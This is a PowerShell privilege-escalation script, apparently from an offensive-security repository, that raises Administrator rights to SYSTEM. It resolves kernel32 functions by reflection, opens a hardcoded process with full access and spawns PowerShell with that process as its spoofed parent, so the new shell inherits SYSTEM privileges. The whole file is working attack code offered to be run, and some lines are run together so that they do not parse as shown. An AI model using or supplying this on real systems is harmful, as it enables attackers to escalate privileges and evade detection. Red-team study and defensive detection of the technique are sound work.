# Not so quick but dirty code to elevate privileges from Administrator to SYSTEM.
# Run the powershell as Admin and copy paste the code or run the file.

# No proper error handling is in the code, it can crash any time. Debugging is
# the user's responsibility. Pull requests are welcome.

# Author: @xoreipeip - Balazs Bucsay
# Snippets were copy pasted from: 
# # Get-System (@harmj0y, @mattifestation)
# # PPID-Spoof (In Ming Loh)
# # Get-TokenPrivs (@FuzzySec) 

$ProcessID = 1476
#$command = "c:\\windows\\system32\\cmd.exe"
$Command = "c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe"

function Local:Get-DelegateType
{
	Param
	(
		[OutputType([Type])]

		[Parameter( Position = 0)]
		[Type[]]
		$Parameters = (New-Object Type[](0)),

		[Parameter( Position = 1 )]
		[Type]
		$ReturnType = [Void]
	)

	$Domain = [AppDomain]::CurrentDomain
	$DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
	$TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
	$ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
	$MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
	$MethodBuilder.SetImplementationFlags('Runtime, Managed')

	Write-Output $TypeBuilder.CreateType()
}


function Local:Get-ProcAddress
{
	Param
	(
		[OutputType([IntPtr])]

		[Parameter( Position = 0, Mandatory = $True )]
		[String]
		$Module,

		[Parameter( Position = 1, Mandatory = $True )]
		[String]
		$Procedure
	)

	# Get a reference to System.dll in the GAC
	$SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
		Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
	$UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
	# Get a reference to the GetModuleHandle and GetProcAddress methods
	$GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
	$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
	# Get a handle to the module specified
	$Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
	$tmpPtr = New-Object IntPtr
	$HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

	# Return the address of the function
	Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
}

$IsWow64ProcessAddr = Get-ProcAddress kernel32.dll IsWow64Process
$AddressWidth = $null

try {
	$AddressWidth = @(Get-WmiObject -Query 'SELECT AddressWidth FROM Win32_Processor')[0] | Select-Object -ExpandProperty AddressWidth
} catch {
	throw 'Unable to determine OS processor address width.'
}

switch ($AddressWidth) {
	'32' {
		$64bitOS = $False
	}

	'64' {
		$64bitOS = $True

		#$IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
		#$IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
    }

	default {
		throw 'Invalid OS address width detected.'
	}
}
$InitializeProcThreadAttributeListAddr = Get-ProcAddress kernel32.dll InitializeProcThreadAttributeList
$InitializeProcThreadAttributeListDelegate = Get-DelegateType @([IntPtr], [UInt32], [UInt32], [IntPtr].MakeByRefType()) ([Bool])
$InitializeProcThreadAttributeList = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($InitializeProcThreadAttributeListAddr, $InitializeProcThreadAttributeListDelegate)
$OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
$OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
$OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
$UpdateProcThreadAttributeAddr = Get-ProcAddress kernel32.dll UpdateProcThreadAttribute
$UpdateProcThreadAttributeDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([Bool])
$UpdateProcThreadAttribute = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($UpdateProcThreadAttributeAddr, $UpdateProcThreadAttributeDelegate)
$CreateProcessWAddr = Get-ProcAddress kernel32.dll CreateProcessW
$CreateProcessWDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([Bool])
$CreateProcessW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateProcessWAddr, $CreateProcessWDelegate)

Add-Type -TypeDefinition @"
  using System;
  using System.Runtime.InteropServices;
  [StructLayout(LayoutKind.Sequential)]
  public struct PROCESS_INFORMATION 
  {
     public IntPtr hProcess; public IntPtr hThread; public uint dwProcessId; public uint dwThreadId;
  }
  [StructLayout(LayoutKind.Sequential,  CharSet = CharSet.Unicode)]
  public struct STARTUPINFOEX
  {
       public STARTUPINFO StartupInfo; public IntPtr lpAttributeList;
  }
  [StructLayout(LayoutKind.Sequential,  CharSet = CharSet.Unicode)]
  public struct STARTUPINFO
  {
      public uint cb; public string lpReserved; public string lpDesktop; public string lpTitle; public uint dwX; public uint dwY; public uint dwXSize; public uint dwYSize; public uint dwXCountChars; public uint dwYCountChars; public uint dwFillAttribute; public uint dwFlags; public short wShowWindow; public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError;
  }
"@
$sInfo = New-Object StartupInfo
$sInfoEx = New-Object STARTUPINFOEX
$pInfo = New-Object PROCESS_INFORMATION

$sInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($sInfoEx)$lpSize = [IntPtr]::Zero$sInfoEx.StartupInfo = $sInfo
$lpSize = [IntPtr]::Zero$InitializeProcThreadAttributeList.Invoke([IntPtr]::Zero, 1, 0, [ref]$lpSize) | Out-Null
$sInfoEx.lpAttributeList = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($lpSize)
$InitializeProcThreadAttributeList.Invoke($sInfoEx.lpAttributeList, 1, 0, [ref]$lpSize) | Out-Null
$hProcess = $OpenProcess.Invoke(0x001FFFFF, $false, $ProcessID) 
$lpValue = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([IntPtr]::Size)
[System.Runtime.InteropServices.Marshal]::WriteIntPtr($lpValue, $hProcess)
$UpdateProcThreadAttribute.Invoke($sInfoEx.lpAttributeList, 0, 0x00020000,    $lpValue, [IntPtr]::Size, [IntPtr]::Zero, [IntPtr]::Zero) | Out-Null
$sInfoExSize = [System.Runtime.InteropServices.Marshal]::SizeOf($sInfoEx)
$pInfoSize = [System.Runtime.InteropServices.Marshal]::SizeOf($pInfo)
[IntPtr]$sInfoExPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($sInfoExSize)
[IntPtr]$pInfoPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($pInfoSize) 
[System.Runtime.InteropServices.Marshal]::StructureToPtr($sInfoEx, $sInfoExPtr, $false)
[System.Runtime.InteropServices.Marshal]::StructureToPtr($pInfo, $pInfoPtr, $false)
$cmd = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($command)
$res = $CreateProcessW.Invoke($cmd, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero,
    0,0x00080010, [IntPtr]::Zero, [IntPtr]::Zero, $sInfoExPtr, $pInfoPtr)
if($res)
{
    Write-Host "Process $spawnTo is spawned with pid "$pInfo.dwProcessId  
}else{
    Write-Host "Failed to spawn process $spawnTo"
}